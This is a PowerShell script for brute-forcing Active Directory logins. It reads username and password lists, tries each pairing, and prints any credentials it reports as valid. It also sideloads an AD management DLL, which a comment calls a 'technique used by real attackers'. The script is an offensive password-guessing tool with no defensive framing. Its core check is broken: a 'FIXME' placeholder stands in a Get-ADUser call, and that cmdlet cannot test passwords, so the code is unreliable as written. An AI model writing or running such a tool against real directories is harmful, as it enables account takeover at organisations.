
<#
.Synopsis
    This script attempts to find valid credentials for a set of users by trying different passwords

.DESCRIPTION
    This script takes two files as input, one with usernames and one with passwords. It then attempts 
    to authenticate each of the users with each of the passwords, and prints out any valid credentials
    that it finds.

.EXAMPLE
    .\Bruteforce.ps1 -passwordsFile .\passwords.txt -usersFile .\users.txt -waitTime 1

.PARAMETER passwordsFile
    Path to the file containing the passwords

.PARAMETER usersFile
    Path to the file containing the usernames

.PARAMETER waitTime
    The amount of time (in seconds) to wait after each authentication attempt
#>


[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$passwordsFile,

    [Parameter(Mandatory=$true)]
    [string]$usersFile,

    [Parameter(Mandatory=$false)]
    [int]$waitTime = 0
)


# We import the ActiveDirectory module without the need to install it on the current computer, the dll has been extracted from a Windows 10 x64 with RSAT installed
# technique used by real attackers
Import-Module .\Microsoft.ActiveDirectory.Management.dll

# Try to open the files and check for errors
try {
    $passwords = Get-Content $passwordsFile
    $users = Get-Content $usersFile
} catch {
    Write-Error "Error opening files. Please check if the paths are correct!"
}

# If both files were opened without errors, start the bruteforce attempt
if ($passwords -and $users) {
    foreach ($user in $users) {
        foreach ($password in $passwords) {
            # Try to authenticate the user with the current password
            $result = Get-ADUser  -Identity $user FIXME
            if ($result.AuthenticationResult -eq "AuthenticationSuccess") {
                Write-Host "Found valid credentials for user $user : $password"
            }
            Start-Sleep -Seconds $waitTime
        }
    }
}
